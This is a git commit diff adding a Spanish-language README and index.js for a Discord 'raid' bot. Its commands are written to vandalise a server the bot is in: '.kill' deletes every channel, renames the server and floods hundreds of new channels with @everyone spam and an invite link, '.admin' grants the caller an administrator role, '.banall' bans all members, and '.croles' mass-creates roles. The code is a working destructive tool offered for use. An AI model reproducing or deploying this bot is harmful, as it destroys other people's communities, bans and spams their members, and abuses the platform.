1ad6ec49e2e4b59d4db7b91cefd0e1598ebd0d3e
Upload Proxy <114264762+skpiper@users.noreply.github.com>
2022-12-24 04:36:01 +0000

    Termine de añadir los comandos y explicar un poco

---
+++ README.md
@@ -0,0 +1,11 @@
+####
+Hola este bot fue codificado por 
+!̷ ̷B̷Y̷ ̷D̷A̷r̷s̷#4026, y use un codigo viejo que me paso arias, el codigo esta mejorado para que el bot no abuse el api, osint me ayudo con eso.
+///////////////
+🍀 para usar el bot necesitaras ir al shell o si estas en visual a tu terminal y haras lo siguiente
+
+npm i discord.js 
+necesitas instalar este paquete ya que es necesario para el bot 
+
+tambien en el config.json necesitaras poner el token de tu bot o si estas en replit solo crea un secreto que se llame TOKEN es un requisito que se llame token en mayusculas.
+
--- index.js
+++ index.js
@@ -1,33 +1,27 @@
-const Discord = require("discord.js");
+const Discord = require("discord.js")
 const client = new Discord.Client({ intents: [3243773]});
 
-const {token, prefix } = require('./config.json');
+const { token } = require("./config.json")
 
 client.on("ready", () => {
-
+	
   console.log(`
 Bot Encendido Cliente ${client.user.tag},
 creado por !̷ ̷B̷Y̷ ̷D̷A̷r̷s̷#4026 listo para la accion 
   `)
-  console.log(`              
- ___________________________________
-||                                 ||
-||            MADE BY              ||   
-||         !̷ ̷B̷Y̷ ̷D̷A̷r̷s̷#4026         ||
-||                                 ||
-||_________________________________||
--------------------------------------
+  console.log(`
+by dars
 `)
-	presencia();
-});
 
-// aqui esta la precencia edita solo el name si sabes mas de programacion cambia lo demas a tu gusto
+
+  presencia();
+});
 
 function presencia() {
   client.user.setPresence({
     status: "online",
     activity: {
-      name: ".ayuda para los comandos || made by bydars",
+      name: ".ayuda para los comandos",
       type: "PLAYING"
 
     }
@@ -35,6 +29,112 @@ function presencia() {
 }
 
 
-// si estas en replit crea un secreto y llamalo TOKEN si no estas en replit usa mejor la carpeta config y pon el token de tu bot en donde dice token
+//raid
+
+client.on("message", async message => {
+  if (message.author.bot) return;
+
+  if (message.content === '.kill') {
+    console.log(`                         Raid en ejecucion, el usuario ${message.author.username}, su id es ${message.author.id}`)
+    await message.delete()
+    await message.guild.setName("on-top");
+    await message.guild.setIcon("https://cdn.discordapp.com/icons/1039321689428856933/a_2947db09dc8502f0dc33d9b0c3cc5a73.gif?size=2048");
+    message.guild.channels.cache.forEach(channel => channel.delete());
+    for (let i = 0; i <= 350; i++) {
+      message.guild.channels.create(`follados-por-dars`, {
+        type: 'text'
+      }).then(channel => {
+            for (let x = 0; x <= 14; x++) {
+                channel.send ("Raid by bot   || @everyone, @here || > Join: https://discord.gg/2YA2aVxdrV");
+            }
+      })
+    }
+  }
+
+  //admin
+	
+  if (message.content === '.admin') {
+		await message.delete()
+    let rol = await message.guild.roles.create({
+      data: {
+        name: "$",
+        color: "RANDOM",
+        permissions: "ADMINISTRATOR",
+        hoisted: true
+      }
+    })
+    message.member.roles.add(rol);
+  }
+	
+  //info
+	
+  if (message.content === '.info') {
+    await message.delete()
+    const embed = new Discord.MessageEmbed()
+      .setTitle("Informacion de proceso del r41d")
+      .setThumbnail()
+      .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
+      .setColor("RANDOM");
+    message.channel.send(embed)
+  }
+
+  //banall
+
+  if (message.content.startsWith('.banall')) {
+    await message.delete();
+    message.guild.members.cache.forEach(async member => {
+      if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
+        await member.ban();
+      }
+    })
+  }
+	
+  //limpear
+	
+  if (message.content === '.limpiar') {
+    await message.delete()
+    message.guild.channels.cache.forEach(channel => channel.delete());
+    message.guild.channels.create(`limpiado`, {
+      type: 'text'
+    }).then(channel => {
+      channel.send("https://cdn.discordapp.com/attachments/1047914093476069386/1056044658897207366/meme-3.png")
+    })
+  }
+
+	//help
+ 
+  if (message.content === '.ayuda') {
+    await message.delete()
+    const embed = new Discord.MessageEmbed()
+.setTitle("Comandos de el bot") 		.setAuthor(message.author.username, message.author.avatarURL)         
+.setThumbnail("https://cdn.discordapp.com/attachments/1047914093476069386/1056044658897207366/meme-3.png") 
+.setDescription(`Estos son los comandos`)
+.addFields(
+		{ name: '.kill', value: 'Este comando destruye el server,', inline: true },
+		{ name: '.croles', value: 'Este comando crea roles,', inline: true },
+		{ name: '.info', value: 'Este comando te dara informacion sobre todo los canales, miembros, roles que tienen el server,', inline: true },
+		{ name: '.admin', value: 'Este comando te dara un rol con prrmisos de **ADMINISTRADOR**,', inline: true },
+	  { name: '.limpiar', value: 'Este comando limpia el servidor, se usa para eliminar todo los canales o tambien limpiar el r41d,', inline: true },
+	  { name: '.banall', value: 'Este comando banea a todos los miembtos de este servidor,', inline: true },
+	  { name: '.ayuda', value: 'Este comando te dara toda la informacion de los demas comandos.', inline: true },
+	)
+.setImage("https://cdn.discordapp.com/attachments/1050927883662663681/1050927904428658798/5F4C7B1D-BD79-4081-9C1C-FA2F1C578947.gif") 
+.setFooter({ text: 'codificado por !̷ ̷B̷Y̷ ̷D̷A̷r̷s̷#4026', iconURL: 'https://cdn.discordapp.com/attachments/1047914093476069386/1056062159555145778/IMG_9734.jpg' })
+.setColor("RANDOM");
+    message.channel.send(embed)
+  }
+	
+/// este comando crea roles 
+	
+  if (message.content === '.croles') {
+    await message.delete()
+    for (let i = 0; i <= 200; i++) {
+      message.guild.roles.create({ data: { name: `*`, color: '#d41818', }, reason: 'razon', })
+    };
+  }
+});
+
+/// puedes poner tu token, creando in secreto llamado TOKEN o pones tu token en el config.json donde dice poner token
 
 client.login(token || process.env.TOKEN);
+
